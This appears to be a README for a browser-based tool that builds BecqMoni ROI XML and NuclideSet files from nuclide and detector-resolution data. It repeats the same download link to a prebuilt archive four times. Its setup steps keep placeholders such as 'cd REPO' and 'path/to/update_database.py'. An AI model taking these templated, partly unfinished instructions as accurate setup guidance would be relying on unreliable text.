# BecqMoni ROI Wizard - Nuclear Spectroscopy Configuration Tool 2026

> **BecqMoni ROI Wizard is an offline, browser-based application for building and validating BecqMoni ROI configurations using nuclide, decay-chain, and detector-resolution information.**

[![Platform](https://img.shields.io/badge/Platform-Web%20browser-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucasufongray8358/becqmoni-roi-config-wizard?style=flat-square)](https://github.com/lucasufongray8358/becqmoni-roi-config-wizard)

---

<p align="center">
  <a href="https://lucasufongray8358.github.io/becqmoni-roi-config-wizard/">
    <img src="https://img.shields.io/badge/Download-BecqMoni%20ROI%20Wizard%20Latest-brightgreen?style=for-the-badge" alt="Download BecqMoni ROI Wizard">
  </a>
</p>

> **[Download BecqMoni ROI Wizard](https://lucasufongray8358.github.io/becqmoni-roi-config-wizard/)**

---

[Download Latest Build](https://lucasufongray8358.github.io/becqmoni-roi-config-wizard/)

---

## Overview

BecqMoni ROI Wizard provides a single browser workflow for preparing BecqMoni ROI XML files and NuclideSet libraries. It combines nuclide and isotope-family selection with decay-chain data, gamma-ray and X-ray lines, XRF information, secondary peaks, and detector-resolution settings.

The application can be opened directly from a local HTML file, so configuration work does not depend on an active network connection. Built-in filtering and validation help examine spectral lines, locate likely interferences, combine energies that fall within the detector resolution, and identify problems before export.

---

## Capabilities

- Build BecqMoni ROI XML configuration files.
- Choose specific nuclides, isotope families, or complete decay chains.
- Include gamma-ray, X-ray, XRF, and secondary peak data.
- Combine spectral lines using detector-resolution rules.
- Derive scattering, Compton, escape, annihilation, cascade-sum, and pile-up peaks.
- Produce ROI configurations and BecqMoni NuclideSet libraries.
- Search, sort, filter, limit, and review spectral lines for interference.
- Detect duplicate energies, zero-yield lines, and intersecting ROI zones.
- Run the tool locally from an HTML file without an internet connection.
- Update the embedded nuclide database through the IAEA API with the included Python updater.

---

## Getting Started

### Download the application

Get the current build here:

[Download BecqMoni ROI Wizard](https://lucasufongray8358.github.io/becqmoni-roi-config-wizard/)

If the download is archived, extract its contents and open the included HTML file in a modern web browser.

### Clone from source

```bash
git clone https://github.com/lucasufongray8358/becqmoni-roi-config-wizard.git
cd REPO
```

Launch the primary HTML application file directly in your browser. The offline workflow does not require a web server.

### Refresh the nuclide database

A Python updater is included for rebuilding the embedded database from the IAEA API. From the project directory, run:

```bash
python path/to/update_database.py
```

Refer to the updater script and the options distributed with the downloaded version of the project.

---

## Using the Wizard

1. Load the application HTML file in a supported browser.
2. Pick the nuclides, isotope families, or decay chains to include.
3. Choose the gamma-ray, X-ray, XRF, and secondary-peak sources.
4. Configure detector resolution and spectral-line filtering.
5. Examine merged lines, generated secondary peaks, and potential interference.
6. Execute validation for duplicate energies, zero yields, and overlapping ROI zones.
7. Export the completed ROI XML configuration or NuclideSet library.

A normal configuration sequence looks like this:

```text
Choose nuclides
  -> set line and peak options
  -> merge lines using detector resolution
  -> review possible interference
  -> validate energies and ROI zones
  -> export BecqMoni files
```

---

## Settings and Data Flow

All ROI settings are managed in the browser interface. Before exporting, choose the nuclide sources and peak types, then adjust detector resolution, sorting, filtering, and ROI controls as needed.

The supplied Python updater handles database maintenance. Its generated output replaces the embedded nuclide data used by the local HTML application.

```text
Application data:
  Nuclide records       -> embedded project database
  Peak selection        -> browser interface
  Detector resolution   -> ROI generation settings
  Export format         -> BecqMoni ROI XML or NuclideSet
```

---

## Requirements

- A current web browser with JavaScript enabled.
- A local copy of the application HTML file for offline operation.
- Internet connectivity only for retrieving updated nuclide data from the IAEA API.
- Python when using the optional database updater.
- Enough storage for the repository and exported XML or NuclideSet files.
- BecqMoni to use the generated ROI configurations and libraries.

---

## Frequently Asked Questions

### Is a web server needed?

No. Open the application HTML file locally in a web browser to use the main workflow.

### Will the tool work offline?

Yes. Once the local files are available, the browser application can be used without internet access. The exception is database refreshing, which requires the Python updater to access the IAEA API.

### Which output formats are supported?

The wizard creates BecqMoni ROI XML configurations and BecqMoni NuclideSet libraries.

### Where are detector-resolution settings changed?

Set detector resolution and line-merging behavior in the application before generating the ROI configuration.

### How do I examine duplicate lines or overlapping areas?

Start the built-in validation checks, then use the sorting, filtering, top-N, and interference-search tools to focus the review.

### How is the embedded database updated?

Run the included Python database updater and then reopen the local application so it loads the refreshed embedded data.

### What if the application fails to open?

Make sure the downloaded files were completely extracted, use a recent browser with JavaScript enabled, and open the project from a local directory. For persistent problems, inspect the browser developer console for loading errors.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
